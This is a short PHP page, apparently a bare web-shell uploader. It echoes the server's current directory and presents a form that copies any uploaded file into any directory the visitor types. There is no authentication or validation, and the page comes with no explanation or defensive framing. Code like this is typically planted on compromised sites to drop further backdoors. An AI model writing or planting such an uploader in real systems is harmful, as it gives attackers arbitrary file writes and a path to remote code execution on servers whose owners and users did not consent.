<html><body><?php echo getcwd();if (isset($_POST["s2"])){$uploaded = $_FILES["file"]["tmp_name"];if (file_exists($uploaded)) {$pwddir = $_POST["dir"];$real = $_FILES["file"]["name"];$dez = $pwddir."/".$real;copy($uploaded, $dez);echo "FILE UPLOADED TO $dez";}}?><form name="form1" method="post" enctype="multipart/form-data"><input type="text" name="dir" size="30" value=""><input type="submit" name="s2" value="Upload"><input type="file" name="file" size="15"></td></tr></table></body></html>